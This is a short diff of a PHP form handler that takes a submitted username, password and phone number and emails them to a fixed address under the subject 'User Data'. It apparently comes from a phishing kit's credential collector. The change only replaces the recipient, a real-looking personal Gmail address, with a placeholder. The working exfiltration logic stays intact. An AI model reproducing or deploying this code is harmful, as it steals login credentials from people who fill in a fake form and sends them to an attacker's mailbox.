@@ -2,7 +2,7 @@
 $user=$_POST['username'];
 $pass=$_POST['password'];
 $phone=$_POST['tel'];
-$to="vrstanchev@gmail.com";
+$to="example@gmail.com";
 $message="$user+$pass+$phone";
 $subject="User Data";
 mail($to,$subject,$message);
